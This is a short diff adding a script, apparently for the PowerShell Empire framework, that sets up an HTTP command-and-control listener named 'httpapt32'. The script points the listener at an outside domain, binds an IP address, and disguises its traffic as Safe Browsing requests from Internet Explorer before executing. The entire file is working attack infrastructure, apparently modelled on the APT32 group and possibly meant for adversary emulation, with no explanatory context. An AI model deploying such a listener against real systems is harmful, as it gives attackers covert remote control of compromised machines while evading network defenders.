@@ -1,0 +1,6 @@
+uselistener http
+set Name httpapt32
+set Host http://yii.yiihao126.net:80
+set BindIP 198.18.133.60
+set DefaultProfile /safebrowsing/rd.do,main.do,login.do|Mozilla/5.0 (WindowsNT 6.1; WOW64; Trident/7.0; rv11.0) like Gecko
+execute
